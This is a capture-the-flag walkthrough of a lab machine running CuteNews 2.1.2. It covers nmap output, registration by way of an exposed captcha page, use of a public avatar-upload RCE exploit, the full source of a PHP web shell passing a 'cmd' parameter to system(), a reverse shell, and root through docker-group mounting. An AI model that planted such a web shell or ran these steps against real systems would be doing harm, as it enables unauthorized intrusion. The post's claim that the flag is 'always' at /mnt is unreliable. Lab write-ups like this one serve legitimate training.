# zSecurity Cute

***

## Difficulty == Medium

![httptryhackme comjrzsecurityctf2](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/6efcd269-7e9c-4d17-8ea1-5be1850d6812)

***

Running our nmap scan we have 

```shell
# Nmap 7.94 scan initiated Fri Sep 15 07:13:45 2023 as: nmap -p- -sVC --min-rate=100 -T4 -v -oN nmap.txt 10.10.118.131
Increasing send delay for 10.10.118.131 from 5 to 10 due to 11 out of 25 dropped probes since last increase.
Warning: 10.10.118.131 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.118.131
Host is up (0.13s latency).
Not shown: 65525 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5c:98:a2:10:30:e3:65:4e:88:96:05:7b:b3:9d:0f:3c (RSA)
|   256 de:fd:60:5f:39:b3:c4:c6:7f:aa:bc:5c:64:7c:7c:e2 (ECDSA)
|_  256 00:41:7d:63:29:57:36:64:bc:00:ec:8f:e4:41:5f:d0 (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
|_http-title: Please Login / CuteNews
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4343/tcp  filtered unicall
6245/tcp  filtered unknown
12512/tcp filtered unknown
18111/tcp filtered unknown
27523/tcp filtered unknown
29407/tcp filtered unknown
45422/tcp filtered unknown
60967/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 15 07:25:24 2023 -- 1 IP address (1 host up) scanned in 698.96 seconds
```

Navigating to port 80, we have a login page, i tried several default credentials but non seems to work

![](https://i.imgur.com/I9rFnZI.png)

So i decided to **"Register"** but we need some kind of captcha test, which we don't have because this website doesn't seem to have any captcha running

![](https://i.imgur.com/NWBlteg.png)

I decided to run a directory bruteforce and we have some interesting files on this server including a `captcha.php` page, Right from here, It looks like we have shell already, lmfao 😂

![](https://i.imgur.com/7eqFs12.jpg)

Navigating to `/captcha.php` we have a text, which literally looks like the text we need for this registration, One thing i also noticed is if you refresh this page, you get a different text

![](https://i.imgur.com/PoXetHo.png)

So i created an account with the username and password as `test:test1` and we were logged in

![](https://i.imgur.com/prGbbbr.png)

Clicking the **Personal Options** menu takes us to where we can edit our profile

![](https://i.imgur.com/BxgZ69c.png)

We can see here that we can upload an avatar , This could thereforefor lead to a potential RCE vulnerability, In which Enumerating the CMS version, `Cutenews 2.1.2` ,
gives us an RCE exploit on [github](https://github.com/ColdFusionX/CVE-2019-11447_CuteNews-AvatarUploadRCE).

![](https://i.imgur.com/bObO9rl.png)

Make sure to clone into the exploit directory and then change the details in the `rev.php` file to your VPN IP and desired port :

![](https://i.imgur.com/ev4GtWG.png)

We can then go ahead and start up our listener then launch our exploit as shown in the image below

![](https://i.imgur.com/XrRFNvj.jpg)

Oops, well we didn't get a shell because the web server is not executing this file directly, it is passing it to another IP ADDRESS (I noticed this when i did upload a file in the legal way 😂)

![](https://i.imgur.com/uDnSj6r.png)

![](https://i.imgur.com/GSxkp4R.png)

Now we can launch our exploit again and then navigating to the path which our exploit was uploaded to manually

![](https://i.imgur.com/BcNWvJs.jpg)

![](https://i.imgur.com/F3kCe9n.png)

Note that i did change the code in `shell.php` as shown below

```PHP
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Now we can upload our PHP, Python, Bash or even NC shell through this web shell and get our reverse shell back (I used PHP ☢️)

![](https://i.imgur.com/kXghOcO.png)

We finally got the user flag in the user `jim` home's directory, we can then move on to privilege escalation

![](https://i.imgur.com/OV1qDrg.png)

![](https://i.imgur.com/bvx8CKW.gif)

***
### Privilege Escalation

Running the `id` command we can see that www-data belongs to the supplementary group `docker`. 

![](https://i.imgur.com/KRmVbhf.png)

As shown by [securiumsolutions](https://securiumsolutions.com/docker-privilege-escalation/) , we can get root by using this payload `docker run -v /root:/mnt -it alpine` , as shown below 👇

![](https://i.imgur.com/ghOZvRb.png)

Note that when you do privilege Escalation with docker or container services, the root flag is always stored at `/mnt`, Have Fun 😘

![](https://i.imgur.com/ypxtZBV.gif)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>


